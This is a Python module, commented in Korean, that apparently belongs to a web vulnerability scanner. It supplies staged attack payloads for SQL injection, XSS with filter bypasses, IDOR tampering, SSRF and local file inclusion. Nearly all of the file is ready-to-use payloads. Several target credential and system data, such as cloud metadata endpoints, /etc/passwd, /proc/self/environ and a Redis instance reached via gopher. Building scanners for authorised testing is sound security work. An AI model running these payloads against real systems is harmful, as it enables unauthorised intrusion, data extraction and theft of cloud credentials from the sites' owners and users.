"""
공격 페이로드 생성 모듈
취약점 유형별 페이로드를 단계적으로 생성한다.
안전한 탐지용 → 확인용 → 추출용 순서로 escalation.
"""

import json
import urllib.parse
import random
import string


# ==========================================================
# SQLi Payloads
# ==========================================================

SQLI_PAYLOADS = {
    # Stage 1: Error-based (탐지용 - 에러 유발 확인)
    "error_based": [
        {"payload": "'", "desc": "단일 따옴표 에러 유발"},
        {"payload": "\"", "desc": "더블 따옴표 에러 유발"},
        {"payload": "' OR '1'='1", "desc": "기본 OR 인젝션"},
        {"payload": "1' AND '1'='2", "desc": "FALSE 조건 (응답 차이 확인)"},
        {"payload": "1 AND 1=1", "desc": "숫자형 TRUE 조건"},
        {"payload": "1 AND 1=2", "desc": "숫자형 FALSE 조건"},
        {"payload": "' UNION SELECT NULL--", "desc": "UNION 컬럼 수 탐색 (1개)"},
        {"payload": "' UNION SELECT NULL,NULL--", "desc": "UNION 컬럼 수 탐색 (2개)"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "desc": "UNION 컬럼 수 탐색 (3개)"},
    ],

    # Stage 2: Time-based Blind (에러 안 나올 때)
    "time_based": [
        {"payload": "' AND SLEEP(3)--", "desc": "MySQL SLEEP 3초", "expected_delay": 3},
        {"payload": "' AND pg_sleep(3)--", "desc": "PostgreSQL sleep 3초", "expected_delay": 3},
        {"payload": "'; WAITFOR DELAY '0:0:3'--", "desc": "MSSQL WAITFOR 3초", "expected_delay": 3},
        {"payload": "1 AND SLEEP(3)", "desc": "숫자형 MySQL SLEEP", "expected_delay": 3},
        {"payload": "1 AND (SELECT * FROM (SELECT SLEEP(3))a)", "desc": "서브쿼리 SLEEP", "expected_delay": 3},
    ],

    # Stage 3: Boolean-based Blind
    "boolean_based": [
        {"payload": "' AND 1=1--", "desc": "TRUE 조건 (정상 응답)"},
        {"payload": "' AND 1=2--", "desc": "FALSE 조건 (다른 응답)"},
        {"payload": "' AND SUBSTRING(@@version,1,1)='5'--", "desc": "MySQL 버전 추출 시도"},
        {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "desc": "테이블 존재 확인"},
    ],
}


# ==========================================================
# XSS Payloads
# ==========================================================

XSS_PAYLOADS = {
    # Stage 1: Reflection 확인 (무해한 마커)
    "probe": [
        {"payload": "watchdog<>\"'test", "desc": "특수문자 반사 확인", "marker": "watchdog<>\"'test"},
        {"payload": "<u>watchdog_xss_probe</u>", "desc": "HTML 태그 반사 확인", "marker": "<u>watchdog_xss_probe</u>"},
        {"payload": "{{7*7}}", "desc": "템플릿 인젝션 확인", "marker": "49"},
    ],

    # Stage 2: Script 실행 시도
    "script": [
        {"payload": "<script>alert('WD')</script>", "desc": "기본 script 태그", "marker": "<script>alert('WD')</script>"},
        {"payload": "<img src=x onerror=alert('WD')>", "desc": "이벤트 핸들러 XSS", "marker": "onerror=alert"},
        {"payload": "<svg onload=alert('WD')>", "desc": "SVG 이벤트 XSS", "marker": "onload=alert"},
        {"payload": "\"><script>alert('WD')</script>", "desc": "속성 탈출 + script", "marker": "<script>alert"},
        {"payload": "'><img src=x onerror=alert('WD')>", "desc": "속성 탈출 + img", "marker": "onerror=alert"},
    ],

    # Stage 3: 필터 우회
    "bypass": [
        {"payload": "<scr<script>ipt>alert('WD')</scr</script>ipt>", "desc": "이중 태그 우회"},
        {"payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('WD')>", "desc": "HTML 엔티티 우회"},
        {"payload": "<img/src=x onerror=alert('WD')>", "desc": "슬래시 구분자 우회"},
        {"payload": "javascript:alert('WD')", "desc": "JavaScript URI 스킴"},
        {"payload": "<details open ontoggle=alert('WD')>", "desc": "details 태그 이벤트"},
    ],
}


# ==========================================================
# IDOR Payloads
# ==========================================================

IDOR_PAYLOADS = {
    # Stage 1: 숫자형 ID 변조
    "numeric": [
        {"transform": "increment", "desc": "ID +1 변조"},
        {"transform": "decrement", "desc": "ID -1 변조"},
        {"transform": "zero", "desc": "ID=0 접근 시도"},
        {"transform": "large", "desc": "ID=99999 접근 시도"},
    ],

    # Stage 2: 권한 우회
    "auth_bypass": [
        {"transform": "remove_auth", "desc": "인증 헤더 제거"},
        {"transform": "other_user", "desc": "다른 사용자 ID로 교체"},
    ],

    # Stage 3: 경로 조작
    "path_traversal": [
        {"payload": "../", "desc": "상위 디렉터리 이동"},
        {"payload": "....//", "desc": "이중 인코딩 경로 탈출"},
        {"payload": "%2e%2e%2f", "desc": "URL 인코딩 경로 탈출"},
    ],
}


# ==========================================================
# SSRF Payloads
# ==========================================================

SSRF_PAYLOADS = {
    # Stage 1: 내부 접근 시도
    "internal": [
        {"payload": "http://127.0.0.1/", "desc": "localhost 접근", "marker": "localhost"},
        {"payload": "http://127.0.0.1:80/", "desc": "localhost:80 접근"},
        {"payload": "http://0.0.0.0/", "desc": "0.0.0.0 접근"},
        {"payload": "http://[::1]/", "desc": "IPv6 localhost"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "desc": "AWS 메타데이터"},
        {"payload": "http://metadata.google.internal/", "desc": "GCP 메타데이터"},
    ],

    # Stage 2: 프로토콜 변조
    "protocol": [
        {"payload": "file:///etc/passwd", "desc": "file 프로토콜 LFI"},
        {"payload": "file:///etc/hosts", "desc": "hosts 파일 접근"},
        {"payload": "dict://127.0.0.1:11211/stats", "desc": "dict 프로토콜"},
        {"payload": "gopher://127.0.0.1:6379/_INFO", "desc": "gopher → Redis"},
    ],

    # Stage 3: 우회 기법
    "bypass": [
        {"payload": "http://0177.0.0.1/", "desc": "8진수 IP 우회"},
        {"payload": "http://2130706433/", "desc": "10진수 IP 우회"},
        {"payload": "http://0x7f.0x0.0x0.0x1/", "desc": "16진수 IP 우회"},
        {"payload": "http://127.0.0.1.nip.io/", "desc": "DNS 리바인딩 우회"},
    ],
}


# ==========================================================
# LFI / File Upload Payloads
# ==========================================================

UPLOAD_LFI_PAYLOADS = {
    "lfi": [
        {"payload": "../../etc/passwd", "desc": "기본 LFI", "marker": "root:"},
        {"payload": "....//....//etc/passwd", "desc": "이중 슬래시 LFI", "marker": "root:"},
        {"payload": "..%2f..%2fetc%2fpasswd", "desc": "URL 인코딩 LFI", "marker": "root:"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "desc": "PHP 필터 래퍼"},
        {"payload": "/proc/self/environ", "desc": "환경변수 읽기"},
    ],
}


# ==========================================================
# 페이로드 선택 로직
# ==========================================================

def get_payloads(vuln_type: str, stage: int = 1) -> list:
    """
    취약점 유형 + 단계에 맞는 페이로드 목록 반환.

    Args:
        vuln_type: "sqli", "xss", "idor", "ssrf", "upload"
        stage: 1(탐지), 2(확인), 3(우회/추출)

    Returns:
        list of payload dicts
    """
    payload_map = {
        "sqli": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "idor": IDOR_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
        "upload": UPLOAD_LFI_PAYLOADS,
    }

    payloads_by_type = payload_map.get(vuln_type, {})
    stages = list(payloads_by_type.keys())

    if not stages:
        return []

    # stage 번호를 키 인덱스로 매핑 (1-indexed)
    idx = min(stage - 1, len(stages) - 1)
    stage_key = stages[idx]

    return payloads_by_type[stage_key]


def get_all_payloads(vuln_type: str) -> dict:
    """취약점 유형의 전체 페이로드를 단계별로 반환"""
    payload_map = {
        "sqli": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "idor": IDOR_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
        "upload": UPLOAD_LFI_PAYLOADS,
    }
    return payload_map.get(vuln_type, {})


def generate_idor_payload(original_value, transform_type):
    """
    IDOR 변조값 생성.
    원래 ID 값을 받아서 변조된 값을 반환.
    """
    try:
        num = int(original_value)
        if transform_type == "increment":
            return str(num + 1)
        elif transform_type == "decrement":
            return str(max(0, num - 1))
        elif transform_type == "zero":
            return "0"
        elif transform_type == "large":
            return "99999"
    except (ValueError, TypeError):
        pass

    # 문자열 ID인 경우
    if transform_type == "other_user":
        # 랜덤 UUID-like 문자열
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=len(str(original_value))))

    return str(original_value)
